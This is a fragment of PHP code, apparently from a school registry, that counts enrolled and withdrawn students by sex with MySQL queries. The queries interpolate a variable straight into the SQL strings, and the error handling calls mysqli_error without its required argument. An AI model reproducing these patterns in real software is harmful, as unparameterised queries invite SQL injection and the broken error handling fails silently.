$datos_ano6_inscritoF = mysqli_query($enlace, $query_ano6_inscritoF) or die(mysqli_error());
$totalRows_ano6_inscritoF = mysqli_num_rows($datos_ano6_inscritoF); 

$totalRows_ano6_inscritoM = $totalRows_ano6_inscrito - $totalRows_ano6_inscritoF;




/************************/







/*
$query_inicial_retirado = "SELECT * FROM reg_estu_actual, reg_estudiantes 
         WHERE   reg_estu_actual.id_estud = reg_estudiantes.id_estud

         and  id_seccion != '8'        
         and  fecha_inscripcion != ''   
         and  cursa_actualmente = '$id_periodo_clave'
                 
         and retirado_si_o_no = '1'        
         GROUP BY reg_estudiantes.id_estud";

$datos_inicial_retirado = mysqli_query($enlace, $query_inicial_retirado) or die(mysqli_error());
$totalRows_inicial_retirado = mysqli_num_rows($datos_inicial_retirado); */



$query_inicial_retiradoF = "SELECT * FROM reg_estu_actual, reg_estudiantes 
         WHERE  reg_estu_actual.id_estud = reg_estudiantes.id_estud
                  
         
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
          and  el_activo = '1'       
         and retirado_si_o_no = '1'
         and id_sexo = '1' 
                
         GROUP BY reg_estudiantes.id_estud";

$datos_inicial_retiradoF = mysqli_query($enlace, $query_inicial_retiradoF) or die(mysqli_error());
$totalRows_inicial_retiradoF = mysqli_num_rows($datos_inicial_retiradoF); 



$query_inicial_retiradoM = "SELECT * FROM reg_estu_actual, reg_estudiantes 
         WHERE  reg_estu_actual.id_estud = reg_estudiantes.id_estud
                  
         
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  el_activo = '1'        
         and retirado_si_o_no = '1'
         and id_sexo = '2'  
               
         GROUP BY reg_estudiantes.id_estud";

$datos_inicial_retiradoM = mysqli_query($enlace, $query_inicial_retiradoM) or die(mysqli_error());
$totalRows_inicial_retiradoM = mysqli_num_rows($datos_inicial_retiradoM); 




?>